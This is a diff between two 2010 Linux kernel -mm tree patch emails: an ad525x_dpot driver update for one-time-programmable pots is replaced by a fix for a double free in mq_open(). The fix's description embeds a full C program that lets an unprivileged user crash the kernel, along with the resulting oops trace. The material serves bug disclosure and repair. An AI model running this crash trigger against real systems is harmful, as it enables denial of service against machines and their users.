@@ -1,24 +1,27 @@
 From: akpm@linux-foundation.org
-Subject: + ad525x_dpot-add-support-for-one-time-programmable-pots.patch added to -mm tree
-Date: Mon, 10 May 2010 15:11:38 -0700
-Message-ID: <201005102211.o4AMBcSS025623@imap1.linux-foundation.org>
+Subject: + mqueue-fix-kernel-bug-caused-by-double-free-on-mq_open.patch added to -mm tree
+Date: Mon, 10 May 2010 15:15:23 -0700
+Message-ID: <201005102215.o4AMFNks025696@imap1.linux-foundation.org>
 Reply-To: linux-kernel@vger.kernel.org
+Mime-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=ISO-8859-1
+Content-Transfer-Encoding: QUOTED-PRINTABLE
 Return-path: <mm-commits-owner@vger.kernel.org>
-Received: from smtp1.linux-foundation.org ([140.211.169.13]:38751 "EHLO
+Received: from smtp1.linux-foundation.org ([140.211.169.13]:56248 "EHLO
 	smtp1.linux-foundation.org" rhost-flags-OK-OK-OK-OK)
-	by vger.kernel.org with ESMTP id S1756850Ab0EJWLv (ORCPT
+	by vger.kernel.org with ESMTP id S1753878Ab0EJWP3 (ORCPT
 	<rfc822;mm-commits@vger.kernel.org>);
-	Mon, 10 May 2010 18:11:51 -0400
+	Mon, 10 May 2010 18:15:29 -0400
 Sender: mm-commits-owner@vger.kernel.org
 List-Id: mm-commits@vger.kernel.org
 To: mm-commits@vger.kernel.org
-Cc: michael.hennerich@analog.com, vapier@gentoo.org
+Cc: andre.goddard@gmail.com, adobriyan@gmail.com, stable@kernel.org, viro@zeniv.linux.org.uk
 
 
 The patch titled
-     ad525x_dpot: add support for one time programmable pots
+     mqueue: fix kernel BUG caused by double free() on mq_open()
 has been added to the -mm tree.  Its filename is
-     ad525x_dpot-add-support-for-one-time-programmable-pots.patch
+     mqueue-fix-kernel-bug-caused-by-double-free-on-mq_open.patch
 
 Before you just go and hit "reply", please:
    a) Consider who else should be cc'ed
@@ -26,392 +29,159 @@ Before you just go and hit "reply", please:
    c) Ideally: find the original patch on the mailing list and do a
       reply-to-all to that, adding suitable additional cc's
 
-*** Remember to use Documentation/SubmitChecklist when testing your code ***
+*** Remember to use Documentation/SubmitChecklist when testing your cod=
+e ***
 
 See http://userweb.kernel.org/~akpm/stuff/added-to-mm.txt to find
 out what to do about this
 
-The current -mm tree may be found at http://userweb.kernel.org/~akpm/mmotm/
+The current -mm tree may be found at http://userweb.kernel.org/~akpm/mm=
+otm/
 
 ------------------------------------------------------
-Subject: ad525x_dpot: add support for one time programmable pots
-From: Michael Hennerich <michael.hennerich@analog.com>
+Subject: mqueue: fix kernel BUG caused by double free() on mq_open()
+=46rom: Andr=E9 Goddard Rosa <andre.goddard@gmail.com>
 
-New parts supported:
-	AD5170, AD5171, AD5172, AD5173, AD5273
+In case of aborting because we reach the maximum amount of memory
+which can be allocated to message queues per user (RLIMIT_MSGQUEUE),
+we would try to free the message area twice when bailing out.
 
-Signed-off-by: Michael Hennerich <michael.hennerich@analog.com>
-Signed-off-by: Mike Frysinger <vapier@gentoo.org>
+It can be triggered by any unprivileged user with the following program=
+:
+
+/*
+ * This program causes a Linux kernel BUG by any unprivileged user.
+ * Compile and run it with:
+ * 	$ gcc main_mqueue_BUG.c -lrt; ./a.out
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <mqueue.h>
+#include <string.h>
+#include <sys/time.h>
+#include <sys/stat.h>
+#include <sys/resource.h>
+
+#define MAX_TRIES		32
+#define NAMESIZE		32
+#define NEW_MQ_MEM_LIMIT	16384
+#define BUFFER			8192
+#define MAXMSG			10
+#define MQUEUE_NAME_PATTERN	"/main_mqueue_BUG_%d"
+
+int main()
+{
+	char qname[NAMESIZE];
+	struct mq_attr attr;
+	struct rlimit new_rlimit;
+	int i =3D 0;
+
+	new_rlimit.rlim_cur =3D NEW_MQ_MEM_LIMIT;
+	new_rlimit.rlim_max =3D NEW_MQ_MEM_LIMIT;
+	if (setrlimit(RLIMIT_MSGQUEUE, &new_rlimit) !=3D 0) {
+		perror("Failed BUG exploit! setrlimit() didn't return success");
+		return EXIT_FAILURE;
+	}
+	attr.mq_msgsize =3D BUFFER;
+	attr.mq_maxmsg  =3D MAXMSG;
+	do {
+		snprintf(qname, sizeof(qname), MQUEUE_NAME_PATTERN, i);
+		/* We're leaking the userspace fd (and kernel memory) here on purpose=
+=2E.. */
+		if (mq_open(qname, O_CREAT |O_RDWR, S_IRUSR | S_IWUSR, &attr) =3D=3D =
+(mqd_t)-1)
+			perror("Did we BUG already? mq_open() didn't return success");
+	} while (++i < MAX_TRIES);
+	printf("%s\n", "If the BUG didn't happen yet, it should happen real so=
+on... Check dmesg!");
+
+	return EXIT_SUCCESS;
+}
+
+BUG listing:
+------------
+
+kernel BUG at mm/slub.c:2846!
+invalid opcode: 0000 [#1] PREEMPT SMP
+last sysfs file: /sys/devices/system/cpu/cpu1/cache/index2/shared_cpu_m=
+ap
+CPU 0
+Modules linked in: nfs lockd nfs_acl auth_rpcgss sunrpc vboxnetadp vbox=
+netflt vboxdrv af_packet snd_pcm_oss snd_mixer_oss snd_seq snd_seq_devi=
+ce edd ipv6 cpufreq_conservative cpufreq_userspace cpufreq_powersave ac=
+pi_cpufreq binfmt_misc fuse loop arc4 snd_hda_codec_idt ecb iwl3945 snd=
+_hda_intel iwlcore snd_hda_codec uvcvideo snd_hwdep snd_pcm videodev ma=
+c80211 snd_timer v4l1_compat snd v4l2_compat_ioctl32 i2c_i801 ide_cd_mo=
+d cfg80211 soundcore video sony_laptop snd_page_alloc rfkill i2c_core c=
+drom output sg joydev serio_raw pcspkr ac battery button usbhid hid sd_=
+mod uhci_hcd ahci libata rtc_cmos rtc_core rtc_lib scsi_mod ehci_hcd us=
+bcore fan processor piix ide_core thermal thermal_sys hwmon
+
+Pid: 2743, comm: a.out Not tainted 2.6.34-rc7-3.2-default #252 VAIO/VGN=
+-FZ15L
+RIP: 0010:[<ffffffff810c94d1>]  [<ffffffff810c94d1>] kfree+0xa1/0xb0
+RSP: 0018:ffff880073321dc8  EFLAGS: 00010246
+RAX: ffffea000191ca00 RBX: ffff880073150708 RCX: ffff8800731503a8
+RDX: 4000000000080000 RSI: ffffffff81609520 RDI: ffff880072cc0000
+RBP: ffff880072cc0000 R08: 00000000000004c0 R09: 0000000000000001
+R10: ffff880001622550 R11: ffff880073150700 R12: ffff880073150708
+R13: ffffffff814f84e0 R14: 00000000000fde80 R15: ffff880073150700
+=46S:  00007fd6845616f0(0000) GS:ffff880001800000(0000) knlGS:000000000=
+0000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 00007fd684194fe0 CR3: 000000007e0a4000 CR4: 00000000000006f0
+DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
+Process a.out (pid: 2743, threadinfo ffff880073320000, task ffff88007dd=
+5f800)
+Stack:
+0000000000000040 ffff880073150708 ffff880073150700 ffffffff811e0012
+<0> ffff880073150708 ffffffff813cb200 ffffffff814f0820 0000000000124f80
+<0> 00000000000fde80 ffffffff810e47ec ffff880073150708 0000000000000000
+Call Trace:
+[<ffffffff811e0012>] ? mqueue_delete_inode+0x92/0x120
+[<ffffffff810e47ec>] ? generic_delete_inode+0x8c/0x130
+[<ffffffff811e0322>] ? mqueue_get_inode+0x282/0x290
+[<ffffffff811e0430>] ? mqueue_create+0x90/0x190
+[<ffffffff810d8eec>] ? vfs_create+0xac/0xd0
+[<ffffffff811e0ae2>] ? sys_mq_open+0x5b2/0x710
+[<ffffffff81002eab>] ? system_call_fastpath+0x16/0x1b
+Code: 5d c3 48 89 ea 48 89 c6 e8 ed fa ff ff eb ea 66 f7 c2 00 c0 74 15=
+ 41 5b 48 89 c7 5b 5d e9 c8 75 fd ff 48 8b 40 10 48 8b 10 eb 90 <0f> 0b=
+ eb fe 66 66 2e 0f 1f 84 00 00 00 00 00 48 83 ec 08 48 81
+
+Signed-off-by: Andr=E9 Goddard Rosa <andre.goddard@gmail.com>
+Cc: Alexey Dobriyan <adobriyan@gmail.com>
+Cc: Al Viro <viro@zeniv.linux.org.uk>
+Cc: <stable@kernel.org>
 Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
 ---
 
- drivers/misc/Kconfig           |    2 
- drivers/misc/ad525x_dpot-i2c.c |    5 +
- drivers/misc/ad525x_dpot.c     |  121 +++++++++++++++++++++++++++++--
- drivers/misc/ad525x_dpot.h     |   42 +++++++---
- 4 files changed, 150 insertions(+), 20 deletions(-)
+ ipc/mqueue.c |    1 +
+ 1 file changed, 1 insertion(+)
 
-diff -puN drivers/misc/Kconfig~ad525x_dpot-add-support-for-one-time-programmable-pots drivers/misc/Kconfig
---- a/drivers/misc/Kconfig~ad525x_dpot-add-support-for-one-time-programmable-pots
-+++ a/drivers/misc/Kconfig
-@@ -24,7 +24,7 @@ config AD525X_DPOT
- 	  AD5260, AD5262, AD5263, AD5290, AD5291, AD5292, AD5293,
- 	  AD7376, AD8400, AD8402, AD8403, ADN2850, AD5241, AD5242,
- 	  AD5243, AD5245, AD5246, AD5247, AD5248, AD5280, AD5282,
--	  ADN2860
-+	  ADN2860, AD5273, AD5171, AD5170, AD5172, AD5173
- 	  digital potentiometer chips.
- 
- 	  See Documentation/misc-devices/ad525x_dpot.txt for the
-diff -puN drivers/misc/ad525x_dpot-i2c.c~ad525x_dpot-add-support-for-one-time-programmable-pots drivers/misc/ad525x_dpot-i2c.c
---- a/drivers/misc/ad525x_dpot-i2c.c~ad525x_dpot-add-support-for-one-time-programmable-pots
-+++ a/drivers/misc/ad525x_dpot-i2c.c
-@@ -97,6 +97,11 @@ static const struct i2c_device_id ad_dpo
- 	{"ad5280", AD5280_ID},
- 	{"ad5282", AD5282_ID},
- 	{"adn2860", ADN2860_ID},
-+	{"ad5273", AD5273_ID},
-+	{"ad5171", AD5171_ID},
-+	{"ad5170", AD5170_ID},
-+	{"ad5172", AD5172_ID},
-+	{"ad5173", AD5173_ID},
- 	{}
- };
- MODULE_DEVICE_TABLE(i2c, ad_dpot_id);
-diff -puN drivers/misc/ad525x_dpot.c~ad525x_dpot-add-support-for-one-time-programmable-pots drivers/misc/ad525x_dpot.c
---- a/drivers/misc/ad525x_dpot.c~ad525x_dpot-add-support-for-one-time-programmable-pots
-+++ a/drivers/misc/ad525x_dpot.c
-@@ -47,6 +47,11 @@
-  * AD5280		1		256		20, 50, 200
-  * AD5282		2		256		20, 50, 200
-  * ADN2860		3		512		25, 250
-+ * AD5273		1		64		1, 10, 50, 100 (OTP)
-+ * AD5171		1		64		5, 10, 50, 100 (OTP)
-+ * AD5170		1		256		2.5, 10, 50, 100 (OTP)
-+ * AD5172		2		256		2.5, 10, 50, 100 (OTP)
-+ * AD5173		2		256		2.5, 10, 50, 100 (OTP)
-  *
-  * See Documentation/misc-devices/ad525x_dpot.txt for more info.
-  *
-@@ -83,7 +88,8 @@ struct dpot_data {
- 	unsigned uid;
- 	unsigned feat;
- 	unsigned wipers;
--	u16 rdac_cache[8];
-+	u16 rdac_cache[MAX_RDACS];
-+	DECLARE_BITMAP(otp_en_mask, MAX_RDACS);
- };
- 
- static inline int dpot_read_d8(struct dpot_data *dpot)
-@@ -161,6 +167,15 @@ static s32 dpot_read_i2c(struct dpot_dat
- 		ctrl = ((reg & DPOT_RDAC_MASK) == DPOT_RDAC0) ?
- 			0 : DPOT_AD5291_RDAC_AB;
- 		return dpot_read_r8d8(dpot, ctrl);
-+	case DPOT_UID(AD5170_ID):
-+	case DPOT_UID(AD5171_ID):
-+	case DPOT_UID(AD5273_ID):
-+			return dpot_read_d8(dpot);
-+	case DPOT_UID(AD5172_ID):
-+	case DPOT_UID(AD5173_ID):
-+		ctrl = ((reg & DPOT_RDAC_MASK) == DPOT_RDAC0) ?
-+			0 : DPOT_AD5272_3_A0;
-+		return dpot_read_r8d8(dpot, ctrl);
- 	default:
- 		if ((reg & DPOT_REG_TOL) || (dpot->max_pos > 256))
- 			return dpot_read_r8d16(dpot, (reg & 0xF8) |
-@@ -241,7 +256,7 @@ static s32 dpot_write_spi(struct dpot_da
- static s32 dpot_write_i2c(struct dpot_data *dpot, u8 reg, u16 value)
- {
- 	/* Only write the instruction byte for certain commands */
--	unsigned ctrl = 0;
-+	unsigned tmp = 0, ctrl = 0;
- 
- 	switch (dpot->uid) {
- 	case DPOT_UID(AD5246_ID):
-@@ -260,6 +275,37 @@ static s32 dpot_write_i2c(struct dpot_da
- 			0 : DPOT_AD5291_RDAC_AB;
- 		return dpot_write_r8d8(dpot, ctrl, value);
- 		break;
-+	case DPOT_UID(AD5171_ID):
-+	case DPOT_UID(AD5273_ID):
-+		if (reg & DPOT_ADDR_OTP) {
-+			tmp = dpot_read_d8(dpot);
-+			if (tmp >> 6) /* Ready to Program? */
-+				return -EFAULT;
-+			ctrl = DPOT_AD5273_FUSE;
-+		}
-+		return dpot_write_r8d8(dpot, ctrl, value);
-+		break;
-+	case DPOT_UID(AD5172_ID):
-+	case DPOT_UID(AD5173_ID):
-+		ctrl = ((reg & DPOT_RDAC_MASK) == DPOT_RDAC0) ?
-+			0 : DPOT_AD5272_3_A0;
-+		if (reg & DPOT_ADDR_OTP) {
-+			tmp = dpot_read_r8d16(dpot, ctrl);
-+			if (tmp >> 14) /* Ready to Program? */
-+				return -EFAULT;
-+			ctrl |= DPOT_AD5270_2_3_FUSE;
-+		}
-+		return dpot_write_r8d8(dpot, ctrl, value);
-+		break;
-+	case DPOT_UID(AD5170_ID):
-+		if (reg & DPOT_ADDR_OTP) {
-+			tmp = dpot_read_r8d16(dpot, tmp);
-+			if (tmp >> 14) /* Ready to Program? */
-+				return -EFAULT;
-+			ctrl = DPOT_AD5270_2_3_FUSE;
-+		}
-+		return dpot_write_r8d8(dpot, ctrl, value);
-+		break;
- 	default:
- 		if (reg & DPOT_ADDR_CMD)
- 			return dpot_write_d8(dpot, reg);
-@@ -291,6 +337,12 @@ static ssize_t sysfs_show_reg(struct dev
- 	struct dpot_data *data = dev_get_drvdata(dev);
- 	s32 value;
- 
-+	if (reg & DPOT_ADDR_OTP_EN)
-+		return sprintf(buf, "%s\n",
-+			test_bit(DPOT_RDAC_MASK & reg, data->otp_en_mask) ?
-+			"enabled" : "disabled");
-+
-+
- 	mutex_lock(&data->update_lock);
- 	value = dpot_read(data, reg);
- 	mutex_unlock(&data->update_lock);
-@@ -319,6 +371,19 @@ static ssize_t sysfs_set_reg(struct devi
- 	unsigned long value;
- 	int err;
- 
-+	if (reg & DPOT_ADDR_OTP_EN) {
-+		if (!strncmp(buf, "enabled", sizeof("enabled")))
-+			set_bit(DPOT_RDAC_MASK & reg, data->otp_en_mask);
-+		else
-+			clear_bit(DPOT_RDAC_MASK & reg, data->otp_en_mask);
-+
-+		return count;
-+	}
-+
-+	if ((reg & DPOT_ADDR_OTP) &&
-+		!test_bit(DPOT_RDAC_MASK & reg, data->otp_en_mask))
-+		return -EPERM;
-+
- 	err = strict_strtoul(buf, 10, &value);
- 	if (err)
- 		return err;
-@@ -330,6 +395,8 @@ static ssize_t sysfs_set_reg(struct devi
- 	dpot_write(data, reg, value);
- 	if (reg & DPOT_ADDR_EEPROM)
- 		msleep(26);	/* Sleep while the EEPROM updates */
-+	else if (reg & DPOT_ADDR_OTP)
-+		msleep(400);	/* Sleep while the OTP updates */
- 	mutex_unlock(&data->update_lock);
- 
- 	return count;
-@@ -377,26 +444,38 @@ static DEVICE_ATTR(name, S_IWUSR | S_IRU
- DPOT_DEVICE_SHOW_SET(rdac0, DPOT_ADDR_RDAC | DPOT_RDAC0);
- DPOT_DEVICE_SHOW_SET(eeprom0, DPOT_ADDR_EEPROM | DPOT_RDAC0);
- DPOT_DEVICE_SHOW_ONLY(tolerance0, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC0);
-+DPOT_DEVICE_SHOW_SET(otp0, DPOT_ADDR_OTP | DPOT_RDAC0);
-+DPOT_DEVICE_SHOW_SET(otp0en, DPOT_ADDR_OTP_EN | DPOT_RDAC0);
- 
- DPOT_DEVICE_SHOW_SET(rdac1, DPOT_ADDR_RDAC | DPOT_RDAC1);
- DPOT_DEVICE_SHOW_SET(eeprom1, DPOT_ADDR_EEPROM | DPOT_RDAC1);
- DPOT_DEVICE_SHOW_ONLY(tolerance1, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC1);
-+DPOT_DEVICE_SHOW_SET(otp1, DPOT_ADDR_OTP | DPOT_RDAC1);
-+DPOT_DEVICE_SHOW_SET(otp1en, DPOT_ADDR_OTP_EN | DPOT_RDAC1);
- 
- DPOT_DEVICE_SHOW_SET(rdac2, DPOT_ADDR_RDAC | DPOT_RDAC2);
- DPOT_DEVICE_SHOW_SET(eeprom2, DPOT_ADDR_EEPROM | DPOT_RDAC2);
- DPOT_DEVICE_SHOW_ONLY(tolerance2, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC2);
-+DPOT_DEVICE_SHOW_SET(otp2, DPOT_ADDR_OTP | DPOT_RDAC2);
-+DPOT_DEVICE_SHOW_SET(otp2en, DPOT_ADDR_OTP_EN | DPOT_RDAC2);
- 
- DPOT_DEVICE_SHOW_SET(rdac3, DPOT_ADDR_RDAC | DPOT_RDAC3);
- DPOT_DEVICE_SHOW_SET(eeprom3, DPOT_ADDR_EEPROM | DPOT_RDAC3);
- DPOT_DEVICE_SHOW_ONLY(tolerance3, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC3);
-+DPOT_DEVICE_SHOW_SET(otp3, DPOT_ADDR_OTP | DPOT_RDAC3);
-+DPOT_DEVICE_SHOW_SET(otp3en, DPOT_ADDR_OTP_EN | DPOT_RDAC3);
- 
- DPOT_DEVICE_SHOW_SET(rdac4, DPOT_ADDR_RDAC | DPOT_RDAC4);
- DPOT_DEVICE_SHOW_SET(eeprom4, DPOT_ADDR_EEPROM | DPOT_RDAC4);
- DPOT_DEVICE_SHOW_ONLY(tolerance4, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC4);
-+DPOT_DEVICE_SHOW_SET(otp4, DPOT_ADDR_OTP | DPOT_RDAC4);
-+DPOT_DEVICE_SHOW_SET(otp4en, DPOT_ADDR_OTP_EN | DPOT_RDAC4);
- 
- DPOT_DEVICE_SHOW_SET(rdac5, DPOT_ADDR_RDAC | DPOT_RDAC5);
- DPOT_DEVICE_SHOW_SET(eeprom5, DPOT_ADDR_EEPROM | DPOT_RDAC5);
- DPOT_DEVICE_SHOW_ONLY(tolerance5, DPOT_ADDR_EEPROM | DPOT_TOL_RDAC5);
-+DPOT_DEVICE_SHOW_SET(otp5, DPOT_ADDR_OTP | DPOT_RDAC5);
-+DPOT_DEVICE_SHOW_SET(otp5en, DPOT_ADDR_OTP_EN | DPOT_RDAC5);
- 
- static const struct attribute *dpot_attrib_wipers[] = {
- 	&dev_attr_rdac0.attr,
-@@ -418,6 +497,26 @@ static const struct attribute *dpot_attr
- 	NULL
- };
- 
-+static const struct attribute *dpot_attrib_otp[] = {
-+	&dev_attr_otp0.attr,
-+	&dev_attr_otp1.attr,
-+	&dev_attr_otp2.attr,
-+	&dev_attr_otp3.attr,
-+	&dev_attr_otp4.attr,
-+	&dev_attr_otp5.attr,
-+	NULL
-+};
-+
-+static const struct attribute *dpot_attrib_otp_en[] = {
-+	&dev_attr_otp0en.attr,
-+	&dev_attr_otp1en.attr,
-+	&dev_attr_otp2en.attr,
-+	&dev_attr_otp3en.attr,
-+	&dev_attr_otp4en.attr,
-+	&dev_attr_otp5en.attr,
-+	NULL
-+};
-+
- static const struct attribute *dpot_attrib_tolerance[] = {
- 	&dev_attr_tolerance0.attr,
- 	&dev_attr_tolerance1.attr,
-@@ -467,6 +566,12 @@ __devinit int ad_dpot_add_files(struct d
- 	if (features & F_CMD_TOL)
- 		err |= sysfs_create_file(&dev->kobj,
- 			dpot_attrib_tolerance[rdac]);
-+	if (features & F_CMD_OTP) {
-+		err |= sysfs_create_file(&dev->kobj,
-+			dpot_attrib_otp_en[rdac]);
-+		err |= sysfs_create_file(&dev->kobj,
-+			dpot_attrib_otp[rdac]);
-+	}
- 
- 	if (err)
- 		dev_err(dev, "failed to register sysfs hooks for RDAC%d\n",
-@@ -486,6 +591,12 @@ inline void ad_dpot_remove_files(struct 
- 	if (features & F_CMD_TOL)
- 		sysfs_remove_file(&dev->kobj,
- 			dpot_attrib_tolerance[rdac]);
-+	if (features & F_CMD_OTP) {
-+		sysfs_remove_file(&dev->kobj,
-+			dpot_attrib_otp_en[rdac]);
-+		sysfs_remove_file(&dev->kobj,
-+			dpot_attrib_otp[rdac]);
-+	}
- }
- 
- __devinit int ad_dpot_probe(struct device *dev,
-@@ -513,7 +624,7 @@ __devinit int ad_dpot_probe(struct devic
- 	data->uid = DPOT_UID(data->devid);
- 	data->wipers = DPOT_WIPERS(data->devid);
- 
--	for (i = DPOT_RDAC0; i <= DPOT_RDAC5; i++)
-+	for (i = DPOT_RDAC0; i < MAX_RDACS; i++)
- 		if (data->wipers & (1 << i)) {
- 			err = ad_dpot_add_files(dev, data->feat, i);
- 			if (err)
-@@ -537,7 +648,7 @@ __devinit int ad_dpot_probe(struct devic
- 	return 0;
- 
- exit_remove_files:
--	for (i = DPOT_RDAC0; i <= DPOT_RDAC5; i++)
-+	for (i = DPOT_RDAC0; i < MAX_RDACS; i++)
- 		if (data->wipers & (1 << i))
- 			ad_dpot_remove_files(dev, data->feat, i);
- 
-@@ -556,7 +667,7 @@ __devexit int ad_dpot_remove(struct devi
- 	struct dpot_data *data = dev_get_drvdata(dev);
- 	int i;
- 
--	for (i = DPOT_RDAC0; i <= DPOT_RDAC5; i++)
-+	for (i = DPOT_RDAC0; i < MAX_RDACS; i++)
- 		if (data->wipers & (1 << i))
- 			ad_dpot_remove_files(dev, data->feat, i);
- 
-diff -puN drivers/misc/ad525x_dpot.h~ad525x_dpot-add-support-for-one-time-programmable-pots drivers/misc/ad525x_dpot.h
---- a/drivers/misc/ad525x_dpot.h~ad525x_dpot-add-support-for-one-time-programmable-pots
-+++ a/drivers/misc/ad525x_dpot.h
-@@ -15,17 +15,18 @@
- 		(((features) << 18) | (((wipers) & 0xFF) << 10) | \
- 		((max_pos & 0xF) << 6) | (uid & 0x3F))
- 
--#define DPOT_UID(conf) (conf & 0x3F)
--#define DPOT_MAX_POS(conf) ((conf >> 6) & 0xF)
--#define DPOT_WIPERS(conf) ((conf >> 10) & 0xFF)
--#define DPOT_FEAT(conf) (conf >> 18)
--
--#define BRDAC0	(1 << 0)
--#define BRDAC1	(1 << 1)
--#define BRDAC2	(1 << 2)
--#define BRDAC3	(1 << 3)
--#define BRDAC4	(1 << 4)
--#define BRDAC5	(1 << 5)
-+#define DPOT_UID(conf)		(conf & 0x3F)
-+#define DPOT_MAX_POS(conf)	((conf >> 6) & 0xF)
-+#define DPOT_WIPERS(conf)	((conf >> 10) & 0xFF)
-+#define DPOT_FEAT(conf)		(conf >> 18)
-+
-+#define BRDAC0			(1 << 0)
-+#define BRDAC1			(1 << 1)
-+#define BRDAC2			(1 << 2)
-+#define BRDAC3			(1 << 3)
-+#define BRDAC4			(1 << 4)
-+#define BRDAC5			(1 << 5)
-+#define MAX_RDACS		6
- 
- #define F_CMD_INC		(1 << 0)	/* Features INC/DEC ALL, 6dB */
- #define F_CMD_EEP		(1 << 1)	/* Features EEPROM */
-@@ -116,6 +117,11 @@ enum dpot_devid {
- 	AD5282_ID = DPOT_CONF(F_RDACS_RW, BRDAC0 | BRDAC1, 8, 41),
- 	ADN2860_ID = DPOT_CONF(F_RDACS_RW_TOL | F_CMD_INC,
- 			BRDAC0 | BRDAC1 | BRDAC2, 9, 42),
-+	AD5273_ID = DPOT_CONF(F_RDACS_RW | F_CMD_OTP, BRDAC0, 6, 43),
-+	AD5171_ID = DPOT_CONF(F_RDACS_RW | F_CMD_OTP, BRDAC0, 6, 44),
-+	AD5170_ID = DPOT_CONF(F_RDACS_RW | F_CMD_OTP, BRDAC0, 8, 45),
-+	AD5172_ID = DPOT_CONF(F_RDACS_RW | F_CMD_OTP, BRDAC0 | BRDAC1, 8, 46),
-+	AD5173_ID = DPOT_CONF(F_RDACS_RW | F_CMD_OTP, BRDAC0 | BRDAC1, 8, 47),
- };
- 
- #define DPOT_RDAC0		0
-@@ -136,9 +142,11 @@ enum dpot_devid {
- #define DPOT_TOL_RDAC5		(DPOT_REG_TOL | DPOT_RDAC5)
- 
- /* RDAC-to-EEPROM Interface Commands */
--#define DPOT_ADDR_RDAC		(0x00 << 5)
--#define DPOT_ADDR_EEPROM	(0x01 << 5)
--#define DPOT_ADDR_CMD		(0x80)
-+#define DPOT_ADDR_RDAC		(0x0 << 5)
-+#define DPOT_ADDR_EEPROM	(0x1 << 5)
-+#define DPOT_ADDR_OTP		(0x1 << 6)
-+#define DPOT_ADDR_CMD		(0x1 << 7)
-+#define DPOT_ADDR_OTP_EN	(0x1 << 9)
- 
- #define DPOT_DEC_ALL_6DB	(DPOT_ADDR_CMD | (0x4 << 3))
- #define DPOT_INC_ALL_6DB	(DPOT_ADDR_CMD | (0x9 << 3))
-@@ -161,6 +169,12 @@ enum dpot_devid {
- /* AD524x use special commands */
- #define DPOT_AD5291_RDAC_AB	0x80
- 
-+#define DPOT_AD5273_FUSE	0x80
-+#define DPOT_AD5270_2_3_FUSE	0x20
-+#define DPOT_AD5270_2_3_OW	0x08
-+#define DPOT_AD5272_3_A0	0x08
-+#define DPOT_AD5270_2FUSE	0x80
-+
- struct dpot_data;
- 
- struct ad_dpot_bus_ops {
+diff -puN ipc/mqueue.c~mqueue-fix-kernel-bug-caused-by-double-free-on-m=
+q_open ipc/mqueue.c
+--- a/ipc/mqueue.c~mqueue-fix-kernel-bug-caused-by-double-free-on-mq_op=
+en
++++ a/ipc/mqueue.c
+@@ -159,6 +159,7 @@ static struct inode *mqueue_get_inode(st
+ 			    task_rlimit(p, RLIMIT_MSGQUEUE)) {
+ 				spin_unlock(&mq_lock);
+ 				kfree(info->messages);
++				info->messages =3D NULL;
+ 				goto out_inode;
+ 			}
+ 			u->mq_bytes +=3D mq_bytes;
 _
 
-Patches currently in -mm which might be from michael.hennerich@analog.com are
+Patches currently in -mm which might be from andre.goddard@gmail.com ar=
+e
 
-fbdev-bfin-t350mcqb-fb-fix-fbmem-allocation-with-blanking-lines.patch
-linux-next.patch
-backlight-new-driver-for-the-adp8860-backlight-parts.patch
-ad525x_dpot-simplify-duplicated-sysfs-defines.patch
-ad525x_dpot-extend-write-argument-to-16bits.patch
-ad525x_dpot-add-support-for-spi-parts.patch
-ad525x_dpot-add-support-for-ad524x-pots.patch
-ad525x_dpot-add-support-for-adn2860-and-ad528x-pots.patch
-ad525x_dpot-add-support-for-one-time-programmable-pots.patch
-fbdev-bfin-lq035q1-fb-respect-new-ppi-mode-platform-field.patch
+mqueue-fix-kernel-bug-caused-by-double-free-on-mq_open.patch
 
+--
+To unsubscribe from this list: send the line "unsubscribe mm-commits" i=
+n
+the body of a message to majordomo@vger.kernel.org
+More majordomo info at  http://vger.kernel.org/majordomo-info.html
